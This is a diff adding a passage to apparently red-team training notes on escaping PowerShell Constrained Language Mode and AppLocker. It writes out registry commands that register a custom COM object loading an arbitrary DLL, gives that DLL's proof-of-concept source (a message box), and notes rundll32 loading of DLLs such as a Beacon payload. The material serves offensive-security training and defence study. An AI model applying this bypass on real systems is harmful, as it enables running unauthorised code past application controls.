@@ -244,3 +244,75 @@ ConstrainedLanguage
 PS C:\Users\pchilds> [System.Console]::WriteLine("Hello World")
 Cannot invoke method. Method invocation is supported only on core types in this language mode.
 ```
+
+These restrictions are not water-tight however.  For instance, we can still use the [New-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-5.1) cmdlet to load COM objects such as [WScript.Shell](https://ss64.com/vb/shell.html).
+
+```powershell
+PS C:\Users\pchilds> New-Object -ComObject WScript.Shell
+
+SpecialFolders     CurrentDirectory
+--------------     ----------------
+System.__ComObject C:\Users\pchilds
+```
+
+This can be abused by creating a custom COM object that will load an arbitrary DLL into the PowerShell process.  This is a similar process to when we added registry entries for [COM hijacking](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=677d4c2e7f9cb5050301a3be).
+
+```powershell
+PS C:\Users\pchilds> [System.Guid]::NewGuid()
+
+Guid
+----
+6136e053-47cb-4fdd-84b1-381bc5f3edb3
+
+C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
+
+C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'
+
+C:\Users\pchilds> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'
+
+C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
+
+C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
+```
+
+![[Pasted image 20250729093747.png]]
+
+The source code for this DLL is simply:
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+extern "C" __declspec(dllexport) BOOL execute() {
+	MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
+	return TRUE;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		return execute();
+	case DLL_PROCESS_DETACH:
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	}
+	return TRUE;
+}
+```
+
+### Rundll32
+
+AppLocker can enforce DLL rules, but these are rarely enabled due to the performance concerns.
+
+![[Pasted image 20250729093834.png]]
+
+When disabled, you can load arbitrary DLLs using rundll32.  This requires that the DLL have at least one exported function that you call.
+
+![[Pasted image 20250729093859.png]]
+
+> The Beacon DLL payload exports a function called `StartW`, which is specifically intended to be called from rundll32.
